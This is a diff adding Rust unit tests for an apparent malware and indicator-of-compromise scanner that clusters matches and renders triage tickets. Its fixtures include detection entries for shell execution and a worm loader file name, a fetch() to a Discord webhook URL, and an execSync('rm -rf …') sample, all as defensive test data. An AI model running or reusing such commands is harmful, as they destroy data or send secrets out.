+        assert!(body.contains("category: Worm and loader file names"));
+        assert!(body.contains("indicator: setup_bun.js"));
+        assert!(body.contains("Stage-one loader"));
+    }
+
+    fn code_fixture_hit(line: usize) -> Hit {
+        Hit {
+            path: PathBuf::from("requests/__init__.py"),
+            line: Some(line),
+            column: Some(1),
+            line_length: Some(80),
+            excerpt: Some(format!("payload line {line}")),
+            entry: IocEntry {
+                category: "Backdoor".into(),
+                query: "os.system(".into(),
+                kind: IocKind::Substring,
+                reason: "Top-level shell exec on import.".into(),
+                rank: 0,
+            },
+        }
+    }
+
+    #[test]
+    fn cluster_hits_groups_adjacent_lines() {
+        let clusters = cluster_hits(
+            vec![
+                code_fixture_hit(187),
+                code_fixture_hit(188),
+                code_fixture_hit(189),
+                code_fixture_hit(190),
+            ],
+            CLUSTER_RADIUS,
+        );
+        assert_eq!(clusters.len(), 1);
+        assert_eq!(clusters[0].len(), 4);
+    }
+
+    #[test]
+    fn cluster_hits_splits_distant_lines() {
+        let clusters = cluster_hits(
+            vec![code_fixture_hit(50), code_fixture_hit(500)],
+            CLUSTER_RADIUS,
+        );
+        assert_eq!(clusters.len(), 2);
+        assert_eq!(clusters[0].len(), 1);
+        assert_eq!(clusters[1].len(), 1);
+        assert_eq!(clusters[0][0].line, Some(50));
+        assert_eq!(clusters[1][0].line, Some(500));
+    }
+
+    #[test]
+    fn cluster_hits_respects_threshold_boundary() {
+        let joined = cluster_hits(vec![code_fixture_hit(100), code_fixture_hit(120)], 20);
+        assert_eq!(joined.len(), 1);
+        assert_eq!(joined[0].len(), 2);
+
+        let split = cluster_hits(vec![code_fixture_hit(100), code_fixture_hit(121)], 20);
+        assert_eq!(split.len(), 2);
+    }
+
+    #[test]
+    fn cluster_hits_with_zero_gap_returns_singletons() {
+        let clusters = cluster_hits(
+            vec![
+                code_fixture_hit(10),
+                code_fixture_hit(11),
+                code_fixture_hit(12),
+            ],
+            0,
+        );
+        assert_eq!(clusters.len(), 3);
+        assert!(clusters.iter().all(|c| c.len() == 1));
+    }
+
+    #[test]
+    fn cluster_hits_sorts_unsorted_input() {
+        let clusters = cluster_hits(
+            vec![
+                code_fixture_hit(190),
+                code_fixture_hit(187),
+                code_fixture_hit(189),
+            ],
+            CLUSTER_RADIUS,
+        );
+        assert_eq!(clusters.len(), 1);
+        let lines: Vec<Option<usize>> = clusters[0].iter().map(|h| h.line).collect();
+        assert_eq!(lines, vec![Some(187), Some(189), Some(190)]);
+    }
+
+    #[test]
+    fn renders_bundle_body_with_two_code_hits() {
+        let hits = vec![code_fixture_hit(187), code_fixture_hit(190)];
+        let body = render_bundle_body(&hits, "Python", None);
+        assert!(body.starts_with("technology: Python\nhits: 2\n"));
+        // Blank line before each source: is the only record boundary; a hit
+        // carries no internal blank line, so both records survive splitting on "\n\n".
+        assert!(body.contains("\n\nsource: requests/__init__.py"));
+        assert_eq!(body.matches("\n\n").count(), 2);
+        assert!(body.contains("line: 187"));
+        assert!(body.contains("line: 190"));
+        assert!(body.contains("category: Backdoor"));
+        assert!(body.contains("indicator: os.system("));
+        assert!(body.contains("Top-level shell exec on import."));
+    }
+
+    #[test]
+    fn code_snippet_flags_matched_lines_and_shows_context() {
+        let source = "import os\n\n# comment\nos.system(\"x\")\nprint(1)\n";
+        let snippet = code_snippet(source, &[4]).expect("line 4 is in range");
+        // The matched line is flagged; the preceding comment is visible context.
+        assert!(snippet.contains("> 4 | os.system(\"x\")"));
+        assert!(snippet.contains("  3 | # comment"));
+        assert!(snippet.contains("  1 | import os"));
+    }
+
+    #[test]
+    fn code_snippet_truncates_a_minified_line() {
+        let long = "x".repeat(MAX_EXCERPT_LEN + 500);
+        let source = format!("a\n{long}\nb\n");
+        let snippet = code_snippet(&source, &[2]).expect("line 2 is in range");
+        assert!(snippet.contains('…'), "over-long line is truncated");
+        assert!(
+            !snippet.contains(&long),
+            "the full blob never reaches the ticket"
+        );
+    }
+
+    #[test]
+    fn code_snippet_is_none_when_no_line_is_in_range() {
+        assert!(code_snippet("one\ntwo\n", &[99]).is_none());
+        assert!(code_snippet("", &[1]).is_none());
+    }
+
+    #[test]
+    fn code_ticket_body_embeds_a_snippet_instead_of_the_bare_excerpt() {
+        let mut hit = code_hit_fixture();
+        hit.line = Some(2);
+        hit.column = Some(1);
+        let source =
+            "import requests\nfetch('https://discord.com/api/webhooks/123/xyz')\nprint(1)\n";
+        let body = render_ticket_body(&hit, "JavaScript", Some(source));
+        assert!(body.contains("--- code ---"));
+        assert!(body.contains("> 2 | fetch("));
+        assert!(
+            !body.contains("excerpt:"),
+            "the snippet supersedes the standalone excerpt line"
+        );
+    }
+
+    #[test]
+    fn bundle_body_merges_all_matched_lines_into_one_snippet() {
+        let source = (1..=12)
+            .map(|n| format!("line {n}"))
+            .collect::<Vec<_>>()
+            .join("\n");
+        let hits = vec![code_fixture_hit(3), code_fixture_hit(9)];
+        let body = render_bundle_body(&hits, "Python", Some(&source));
+        assert_eq!(
+            body.matches("--- code ---").count(),
+            1,
+            "one merged snippet"
+        );
+        assert!(body.contains(">  3 | line 3"));
+        assert!(body.contains(">  9 | line 9"));
+        assert!(
+            body.contains("   6 | line 6"),
+            "the gap between hits is shown"
+        );
+        assert!(
+            !body.contains("excerpt:"),
+            "per-hit excerpts are dropped once the snippet is present"
+        );
+    }
+
+    #[test]
+    fn find_patterns_fires_on_call_but_not_on_assignment_to_same_name() {
+        let tmp =
+            std::env::temp_dir().join(format!("agentwerk_findpatterns_{}", std::process::id()));
+        let _ = fs::remove_dir_all(&tmp);
+        fs::create_dir_all(&tmp).unwrap();
+        fs::write(
+            tmp.join("payload.js"),
+            "const execSync = wrapper;\nexecSync('rm -rf /tmp/x');\n",
+        )
+        .unwrap();
+
+        let entry = IocEntry {
+            category: "Process execution".into(),
+            query: "execSync(....)".into(),
+            kind: IocKind::Pattern,
+            reason: "Synchronous shell command execution.".into(),
+            rank: 0,
+        };
+        let conf = Conf::default_multiline();
+        let pattern = Pattern::parse(&entry.query, &conf).expect("pattern parses");
+        let entries = vec![(entry, pattern)];
+
+        let mut hits: Vec<Hit> = Vec::new();
+        let count = find_patterns(&tmp, ".js", &entries, |_source, file_hits| {
+            hits.extend(file_hits)
+        });
+        assert_eq!(count, 1, "should fire only on the call");
+        assert_eq!(hits[0].line, Some(2), "match starts on line 2");
+        let excerpt = hits[0].excerpt.as_deref().unwrap();
+        assert!(
+            excerpt.starts_with("execSync("),
+            "excerpt should begin with the call: {excerpt:?}"
+        );
+
+        let _ = fs::remove_dir_all(&tmp);
+    }
+
+    #[test]
+    fn find_paths_matches_filename_substring_anywhere_in_tree() {
+        let tmp = std::env::temp_dir().join(format!("agentwerk_findpaths_{}", std::process::id()));
+        let _ = fs::remove_dir_all(&tmp);
+        fs::create_dir_all(tmp.join("node_modules/widget")).unwrap();
+        fs::create_dir_all(tmp.join("src")).unwrap();
+        fs::write(tmp.join("node_modules/widget/setup_bun.js"), "// payload").unwrap();
+        fs::write(tmp.join("src/main.rs"), "fn main() {}").unwrap();
+
+        let entries = vec![IocEntry {
+            category: "Worm".into(),
+            query: "setup_bun.js".into(),
+            kind: IocKind::File,
+            reason: "loader".into(),
+            rank: 0,
+        }];
+
+        let mut hits = Vec::new();
+        let count = find_paths(&tmp, &entries, |h| hits.push(h));
+        assert_eq!(count, 1);
+        assert_eq!(hits.len(), 1);
+        assert!(hits[0].line.is_none());
+        assert!(hits[0]
+            .path
+            .to_string_lossy()
+            .ends_with("node_modules/widget/setup_bun.js"));
+
+        let _ = fs::remove_dir_all(&tmp);
+    }
+
+    #[test]
+    fn load_catalogue_reads_rank_from_json() {
+        for (name, source) in [
+            ("javascript", IOC_JAVASCRIPT),
+            ("python", IOC_PYTHON),
+            ("rust", IOC_RUST),
+            ("cpp", IOC_CPP),
+            ("go", IOC_GO),
+            ("haskell", IOC_HASKELL),
+        ] {
+            let entries = load_catalogue(source);
+            assert!(
+                entries.iter().enumerate().all(|(i, e)| e.rank == i),
+                "{name}: ranks must match their position so the catalogue is consistently ordered",
+            );
+        }
+    }
+
+    #[test]
+    fn file_clusters_priority_is_the_strongest_indicator_rank() {
+        // Two adjacent hits in one file with different ranks; the cluster takes
+        // the lowest (strongest) rank so it is enqueued ahead of weaker matches.
+        let mut weak = code_fixture_hit(10);
+        weak.entry.rank = 7;
+        let mut strong = code_fixture_hit(11);
+        strong.entry.rank = 2;
+
+        let clusters = file_clusters(vec![weak, strong], "Python", CLUSTER_RADIUS, "");
+        assert_eq!(clusters.len(), 1, "adjacent hits cluster into one ticket");
+        assert_eq!(
+            clusters[0].0, 2,
+            "priority is the lowest rank in the cluster"
+        );
+    }
+
+    #[test]
+    fn write_file_map_paginates_by_thirty_grouped_by_extension() {
+        let dir = std::env::temp_dir().join(format!("file_map_{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        let store = Knowledge::load(&dir).unwrap();
+
+        // 65 files across three extensions: .go (40), .html (20), .woff2 (5).
+        let mut files_by_ext: BTreeMap<String, Vec<String>> = BTreeMap::new();
+        files_by_ext.insert(
+            ".go".into(),
+            (0..40).map(|i| format!("go/f{i}.go")).collect(),
+        );
+        files_by_ext.insert(
+            ".html".into(),
+            (0..20).map(|i| format!("web/p{i}.html")).collect(),
+        );
+        files_by_ext.insert(
+            ".woff2".into(),
+            (0..5).map(|i| format!("fonts/f{i}.woff2")).collect(),
+        );
+
+        let pages = write_file_map(&store, &files_by_ext);
+        assert_eq!(pages, 3, "ceil(65/30) = 3 pages");
+
+        let index = store.index();
+        for slug in ["file-map-01", "file-map-02", "file-map-03"] {
+            assert!(index.contains(slug), "index should list {slug}: {index}");
+        }
+
+        // First page opens on the alphabetically-first extension.
+        let page1 = store.pages().load("file-map-01").unwrap();
+        assert!(page1.content.starts_with("## .go\n"), "{}", page1.content);
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+}
